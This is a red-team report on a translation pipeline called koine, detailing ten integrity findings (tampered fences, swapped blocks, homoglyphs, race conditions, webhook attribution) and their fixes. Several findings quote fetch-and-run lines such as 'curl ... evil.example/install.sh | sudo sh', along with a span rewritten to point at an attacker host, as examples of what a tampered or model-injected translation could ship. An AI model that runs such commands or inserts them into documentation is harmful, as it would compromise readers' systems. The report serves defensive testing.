# Red team: the gap between "hash valid" and "identity correct"

koine derives every decision from content hashes and a hash-chained ledger.
That is the claim worth attacking, so this is the record of attacking it:
what broke, what held, and what is still true after the fixes.

The chain was never the weak part. The hash chain, the anchor sidecar and the
stdlib-only external verifier held under every attack in this document. The
breaks were all in the same place — **the boundary between what koine seals
and what koine later reads back**. koine recorded hashes it never compared,
and stopped comparing hashes the moment an unrelated condition fired.

Every finding below was reproduced end to end before it was reported, and
every fix has a regression test that was confirmed **red against the pre-fix
code** and green after. Those tests are in `tests/test_identity_gaps.py`.

## Protocol

Each finding states, in order:

1. **Declared invariant** — what the README, the docstrings or the state table
   promise. A finding is a gap against a promise, not against taste.
2. **Minimal adversarial input** — the smallest mutation that produces it.
3. **Impossible expected state** — the output that should not be reachable.
4. **Observed state** — what actually happened, verbatim.
5. **Cause in the code** — followed to the line before anything was reported.

Nothing is labelled confirmed on inspection alone. Where an attack failed, it
is recorded as failed; see [What held](#what-held).

## Summary

| # | Finding | Severity | Status |
|---|---|---|---|
| F1 | Mirrored fences and frontmatter were sealed but never verified | Critical | Fixed |
| F2 | Two blocks swapped, no content altered, gate green | Critical | Fixed |
| F3 | `STALE` short-circuited the tamper check | High | Fixed |
| F4 | One deleted line turned prose into never-translated frontmatter | High | Fixed |
| F5 | Nothing stopped a model from *inventing* a protected span | High | Fixed |
| F6 | A homoglyph in the source silently disabled a binding glossary term | Medium | Fixed |
| F7 | The ledger was locked; the file the ledger describes was not | Medium-High | Fixed |
| F8 | The webhook attributed a disk-derived queue to a commit it never read | Medium | Partly fixed |
| F9 | `⟦Kn⟧` in the source red-lined the gate permanently | Low-Medium | Fixed |
| F10 | A two-paragraph candidate corrupted placement, then blamed a human | High | Fixed |

---

## F1 — Sealed and never consulted

**Declared invariant.** *"Recorded translation block edited by hand →
`TAMPERED` → exit 2."* And: state is a pure function of content hashes.

**Minimal adversarial input.** Edit the mirrored code fence in the translated
file. Nothing else.

**Impossible expected state.** Gate output byte-identical before and after.

**Observed state.** Exactly that, through the real CLI:

```
--- gate (clean) ---            --- gate (after attack) ---
koine gate: passing …           koine gate: passing …
exit=0                          exit=0
status --explain: gate: OK      status --explain: gate: OK
koine verify: VERIFIED          koine verify: VERIFIED
verify_ledger.py: VERIFIED      verify_ledger.py: VERIFIED
```

…while `README.es.md` said `curl -sSL http://evil.example/install.sh | sudo sh`
and `README.md` said `pip install -e . && pytest -q`. This is the project's
own headline failure — *"a README that lies tells you the old pytest command
with total confidence"* — landing on the one part of a document a reader
copy-pastes and runs.

**Cause in the code.** A double blind spot, each pass assuming the other
covered it:

- `state.derive_states` returned `NOT_TRANSLATABLE` for any block whose kind
  was in `NEVER_TRANSLATED_KINDS` *before* looking at `events` or at the
  translated file at all.
- `state._unsourced_states` skipped the block because its translation index
  **is** in the placement mapping — `block_mapping` folds `mirror` like any
  other placement op.

The ledger held the evidence the whole time. `mirror` events carry a
`translation_hash`; recorded `585bcb92…`, file `c8feb8e1…`, nobody compared
them. Re-running the fleet did not repair it either: `mirror_untranslatable`
decides whether to re-copy from the ledger rather than from the bytes —
deliberately, so a localized fence is not clobbered — so the poisoned fence
was permanent.

**Fix.** Every block koine has a placement for is checked against its seal,
translatable or not. A block with no placement event still makes no claim,
which is the same precondition `_unsourced_states` already applied. A source
fence changed after mirroring is now `STALE` instead of silence.

---

## F2 — Identity confusion, with no content altered

This is F1's root cause answering the sharpest form of the question: is there
a mutation where A→Y and B→X end up exchanged while every individual content
hash stays valid?

**Minimal adversarial input.** Swap two mirrored code fences in the translated
file. Not one byte of either block is altered; the multiset of block hashes in
the file is identical.

**Observed state.** `gate exit=0`, `all translations current`, `chain ok:
True` — with the "install for production" section carrying
`pip install -e . --no-verify` and the "local development" section carrying
`pip install koine --require-hashes`.

Only the *relation* — which source block owns which translated block — was
inverted, so nothing that hashes a block in isolation could see it. The ledger
seals the pairing; the gate simply was not reading it for this class of block.

**Fix.** Same as F1: the pairing is now verified.

---

## F3 — Staleness used as evidence about the translation

**Declared invariant.** `TAMPERED` is exit 2, an integrity failure, distinct
from `STALE`, which is exit 1, ordinary drift. Commit `3ee0caf` exists
specifically to keep `status --explain` from calling a tampered translation
`DRIFT`.

**Minimal adversarial input.** One zero-width space appended to a source
block, plus an arbitrary rewrite of the corresponding translated block. The
source diff is visually empty.

**Impossible expected state.** Attacker-authored content in the translated
file classified as routine drift.

**Observed state.**

| | expected | observed |
|---|---|---|
| state | `TAMPERED` | `STALE` |
| exit | 2 | 1 |
| `status --explain` | `BROKEN` | `DRIFT` |

**Cause in the code.** `derive_states` tested `source_hash` first and
`continue`d, so the translation hash was never compared for a stale block. The
autofix workflow treats drift as automatically repairable, so the fleet would
silently overwrite the tampering and it would never be reported as tampering
at all.

This composes with F6: the source mutation can be a zero-width space, a
non-breaking space, or an NFC→NFD decomposition, all invisible in review.

**Fix.** Integrity is derived before drift. Staleness is a statement about the
source and can never be evidence about the translation. A negative control
test locks in that a stale source with an intact translation is still only
`STALE`.

---

## F4 — The parser decides what is even looked at

**Minimal adversarial input.** Delete one line: the closing `---` of an
existing frontmatter block.

**Observed state.**

```
frontmatter intact → [(0,'frontmatter'), (1,'text'), (2,'text'), (3,'text'), (4,'text')]
one line deleted   → [(0,'frontmatter'  ← swallowed '# Guide' and the security warning),
                      (1,'text')]
```

The swallowed prose is never translated, never mentioned by the gate (there is
no `NOT_TRANSLATABLE` branch in `gate.run_gate`), and shipped verbatim in
English inside the Spanish file, under `koine gate: all translations current`,
exit 0.

**Cause in the code.** `blocks.split_blocks` scanned for the closing delimiter
anywhere in the document, so the next thematic break in the body closed it.

**The inverse, same three lines.** A leading UTF-8 BOM made
`lines[0].strip() == "---"` false, so machine-facing YAML was offered to a
model as translatable prose.

**Fix.** Frontmatter must close before the first blank line — how every
generator that reads it (Jekyll, Hugo, Docusaurus, MkDocs) treats it in
practice. This fails visibly: frontmatter koine does not recognize becomes
ordinary translatable text, which shows up in `koine status`. A BOM is
tolerated for the delimiter test and stays inside the hashed text.

---

## F5 — Freezing is one-directional

**Declared invariant.** *"Models receive prose with protected spans frozen
into placeholders they cannot alter — restoration is verified byte-for-byte,
mechanically."*

**Observed state.** True, and insufficient. A translator returning the
template plus its own text:

```
cycle: [(0,'promoted'), (1,'promoted')]      gate exit=0   all translations current
```

with `Ejecute `curl -sSL http://evil.example/i.sh | sudo sh` y exporte
SECRET_TOKEN=x.` in the shipped file. Nothing compared the set of protected
spans in the translation against the set in the source. The contract stops a
model from *losing* a span and says nothing about *adding* one.

**Second defect, same function.** Check #2 of `submit_candidate`
(`verify_protected_spans` after `thaw`) is structurally unreachable: `thaw`
rejects any placeholder multiset that is not exactly the expected one and then
substitutes all of them, so every span is always present. Fuzzed with
adversarial translators, it fired **0 times**. It was documented as a
"mechanical post-check independent of freeze/thaw", which overstated what was
verified.

**Fix.** `blocks.invented_spans` rejects inline code, images, URLs, HTML tags
and paths the source never had, checked on the model's *template*, where
anything inherited from the source is still a placeholder and cannot be
mistaken for an invention. `ENV_VARS` and CLI flags are deliberately excluded:
all-caps words (`NOTA`, `ВНИМАНИЕ`) and hyphenated compounds are ordinary
prose in many target languages, and falsely rejecting an honest translation
costs more than missing an invented flag that the source diff still shows a
reviewer. Check #2 is kept as a cheap tripwire on `thaw` and is no longer
described as an independent guarantee.

**Known cost of this fix.** A translation that legitimately wants to introduce
backticks or a path the source did not mark is now rejected. The rejection is
loud, named and recoverable.

---

## F6 — Visible equality is not byte equality

**Observed state.** One Cyrillic `м` inside an ASCII word:

```
source, Latin      → ["'commit' must appear as 'commit' in es"]
source, homoglyph  → []          ('Always coмmit the lockfile.')
```

The glossary is the one place a *human* makes a binding decision, and it
failed silently: the term was simply not found, so the rule did not apply and
nothing was said. NFD decomposition did the same thing.

**Fix.** `koine/confusables.py` reports the constructs rather than normalizing
them away — normalizing would destroy the property the ledger depends on, that
a recorded hash means one exact sequence of bytes.

- `glossary.violations` compares NFC-normalized, and reports a term present
  only as a lookalike as its own finding.
- `gate` reports zero-width and bidi controls, and mixed-script words, in both
  source and translation. Exit 1: no seal is broken, but koine derives its
  authority from exactly these mechanical differences and cannot be the one
  party that does not mention them.

Both detections are deliberately narrow, because a false positive here means
rejecting honest documentation. ZWJ/ZWNJ (load-bearing in Indic, Arabic,
Persian and emoji) and the non-breaking space (ordinary French and Spanish
typography) are **not** reported. Whole-word Cyrillic, Greek, Japanese and
Korean are ordinary text and are not reported; only a word built from more
than one writing system is. Verified clean against `tests/fixtures/torture.md`,
the shipped demo and this repo's own README.

---

## F7 — The ledger was locked; what it describes was not

**Observed state.** Two concurrent writers, each reading the translated file,
each placing a block:

```
ledger mapping: {1: 0, 2: 0}    INJECTIVE: False
file contains : ['TRAD-2']
chain ok      : True
gate exit     : 2 — [es] block 1: TAMPERED — "translated block edited outside the pipeline"
```

A lost update produced the exact mapping `contracts._place` exists to refuse,
reached by a route that never consults `_place`. The chain verified; it simply
described a file that did not exist. The gate then named a human for it, and
`_place` was permanently wedged — it refuses to write into a collided slot, so
the pipeline could not self-heal.

**Cause in the code.** `ledger._exclusive` covered `append` alone. `flock` and
`os.replace` appeared nowhere else in the codebase; `_write_raws` was a bare
`write_text`, and the two writers used opposite orders:

```
submit_candidate      : _write_raws → ledger.append → _record_shift
mirror_untranslatable : ledger.append → _record_shift → _write_raws
```

**Fix.** `_exclusive` is re-entrant — an `RLock` serializes threads within the
process and permits nesting, a `flock` taken once at the outermost entry
serializes processes — and `Ledger.transaction()` exposes it. The three
pipeline writers hold it across the whole read-place-write-append.
`_write_raws` is now atomic (tmp + `os.replace`) and refuses to write blocks
that would not read back as the same blocks.

**What this does not fix.** It is not crash-atomic. A process that dies
between the file write and the ledger append leaves a block whose content no
longer matches its seal. That is reported as `TAMPERED` and resolved by
re-adopting. The concurrent-writer half is gone entirely; the crash window is
documented rather than claimed away.

---

## F8 — A queue attributed to a commit nobody read

**Observed state.**

```
push sha=aaaa1111                  → queue: []
SAME sha replayed, disk mutated    → queue: [{block_index: 1, reason: 'STALE'}]
```

The same commit id, two different answers. `compute_work_queue` reads the
working tree; `payload["after"]` was copied into `context.sha` as decoration.
A grep of the module for ordering vocabulary — `before`, `parent`, `ancestry`,
`checkout`, `fetch`, `version` — returned nothing.

Three consequences, each reproduced:

- **Out-of-order delivery.** Webhook A processed after B reports B's content
  under A's sha. Nothing rejects it.
- **Truncated payload.** GitHub sends at most 20 commits and gives no flag
  saying it truncated. With the relevant commit off the list, no tracked path
  matched, no doc was affected, and the queue came back empty. Silence, not an
  error.
- **No branch filter.** A push to `dependabot/npm/lodash` produces a queue
  derived from the working tree as if it were main.

**Fix (partial, deliberately).** koine cannot fix the ordering from here —
that needs a durable queue with commit ancestry, which is a design decision,
not a patch. What it can stop doing is claiming an authority it does not have:

- `head_sha` reads the actual checked-out commit from `.git` (stdlib only, so
  a missing git binary degrades to "unknown", not a traceback). The response
  now carries `event_sha`, `derived_from_sha` and `derived_matches_event`,
  where only `True` is a positive claim and `None` means koine cannot tell.
- A full 20-commit page marks `changed_paths_complete: false` and recomputes
  **every** configured doc. Redundant work is recoverable; reporting no drift
  because the relevant commit fell off the payload is not.
- `forced` is reported, because a force push is where ancestry breaks.

**Still open.** Ordering, deduplication and staleness rejection of webhook
events. The branch is reported but not filtered.

---

## F9 — Denial of service by one character sequence

A source block containing koine's own placeholder syntax, `⟦Kn⟧`, could never
be translated: `thaw` saw a placeholder `freeze` never emitted and rejected
every candidate. Retries 1, 2, 3: `rejected`, `rejected`, `rejected`; state
fixed at `UNTRANSLATED`; `gate exit=1` forever, with no operator recourse.
Anyone able to open a PR against the source document could pin CI red — this
project's own documentation being the first thing that would trip it.

**Fix.** `_PLACEHOLDER_RE` is the first protected pattern, so a literal `⟦Kn⟧`
is frozen like any other protected span. `re.sub` does not rescan its own
replacements, so restoring a literal placeholder is safe.

---

## F10 — The pipeline corrupted itself, then named a human

**Minimal adversarial input.** A model that answers a one-paragraph source
with two paragraphs. No attacker required.

**Observed state.**

```
cycle: [(0,'promoted'), (1,'promoted'), (2,'promoted'), (3,'promoted')]
gate  exit=2
  [es] block 1: TAMPERED — translated block edited outside the pipeline
  [es] translation block 4: UNSOURCED — added or edited afterwards
```

The pipeline promoted 4 of 4 and its own gate then reported an integrity
failure, attributing to a human — *"edited outside the pipeline"* — damage it
had just done itself. The blank line split the text into two blocks on
read-back, so the sealed hash matched nothing in the file and every later
placement shifted by one. Not repairable through the tool.

This is the direct answer to *"does the system hash exactly the representation
it later uses to place and interpret the block?"* — it did not.

**Fix.** `blocks.as_single_block` returns the one text block a candidate will
be read back as, or `None`. `submit_candidate` seals and places **that**, so a
stray trailing newline is absorbed rather than left to desynchronize the hash
from the file, and a genuine second block is rejected as drift. `_write_raws`
refuses any block list that would not read back identically.

---

## What held

Recording failed attacks matters as much as recording successful ones. These
are attacks that were run and did not work.

| Attack | Result |
|---|---|
| Swapping two text blocks with different content | Detected (`STALE`/`TAMPERED`). Content-hash identity works. |
| Duplicate identical source blocks, translations swapped | A genuine no-op — the blocks are identical. Correctly handled. |
| CRLF, lone CR | `read_text` applies universal newlines before sealing, so hashes are stable across line endings. |
| Unclosed fence, ``` mid-paragraph | `_FENCE_RE` requires column 0. Not exploitable. |
| `thaw`: dropped, duplicated, forged-index and `⟦K00⟧` placeholders | All rejected mechanically. |
| freeze/thaw identity under composition (Markdown + HTML + URL + backticks + nesting + env + path + fence) | 4000 samples, 0 failures. Byte-invariance of protected spans holds. |
| Hash chain, anchor sidecar, truncation detection, external verifier | Behave exactly as documented under every attack here. |

One nuance worth stating precisely, because it is easy to overclaim in either
direction. Byte-invariance of protected spans **holds** — and it is not the
security property it reads as:

```
spans: ['https://docs.example', '`sh install.sh`']
candidate: "… desde ⟦K0⟧@evil.example/i y ejecute ⟦K1⟧."
thaw ACCEPTS · every span byte present · verify_protected_spans: []
source URL host = docs.example   →   restored URL host = evil.example
```

Every byte of the span survives. The token the reader copies does not. The
invariant is real; it is a statement about spans, not about what surrounds
them. F5's invented-span check narrows this but does not close it: a model can
still place ordinary prose adjacent to a restored span.

## Residual limits

Stated plainly, because a fix list that reads as complete when it is not is
the failure this project exists to prevent.

- **Ledger rewriting is out of scope by construction.** Anyone who can rewrite
  both `ledger.<lang>.jsonl` and its anchor can produce a chain that verifies.
  The README already says so: only a copy koine does not control — the remote
  git history — catches that.
- **Crash atomicity** between the translated file and the ledger (F7).
- **Webhook ordering and deduplication** (F8).
- **Adjacent-prose attacks on protected spans**, above.
- **Confusable detection is a curated table**, not the full Unicode
  confusables data. It answers "is this ASCII word disguised", not "are these
  two arbitrary strings confusable".
- **`split_blocks` is a lossy projection.** Blank-line structure between
  blocks is not sealed, so the pipeline normalizes it on write. Block content
  is unaffected; the seal covers the blocks, not the whitespace between them.

## Reproducing

```bash
python -m pytest tests/test_identity_gaps.py -q
```

Each test's docstring states the invariant it defends and what the pre-fix
behaviour was. To see them fail against the pre-fix code, revert `koine/` to
the commit before the fix and run the file again — every one of them was
confirmed red that way before being accepted as a regression test.
